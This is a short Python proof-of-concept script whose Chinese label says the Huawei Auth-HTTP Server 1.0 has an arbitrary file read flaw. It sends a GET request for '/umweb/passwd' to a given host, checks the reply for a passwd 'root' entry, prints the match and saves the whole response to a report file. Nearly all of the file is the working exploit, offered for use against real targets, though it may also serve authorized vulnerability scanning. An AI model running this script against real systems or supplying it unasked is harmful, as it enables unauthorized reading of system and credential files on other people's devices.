import re
import requests
import time
import buter
import wirtefile

info = "HuaweiAuth-HTTPServer1.0存在任意文件读取"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/umweb/passwd'
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "DNT": "1"
    }
def hauweiauthreadfile(url):
    try:
        reps = requests.get(url=url+poc,headers=headers,verify=False,timeout=5)
        pattern = re.compile(r'root:.*:0:0')
        match = pattern.search(reps.text)
        if reps.status_code == 200 and match:
            print(buter.colors.GREEN+  f"存在{info} url : {url} \n{match.group()}" + buter.colors.END)
            reptext = url+poc+"\n"+reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
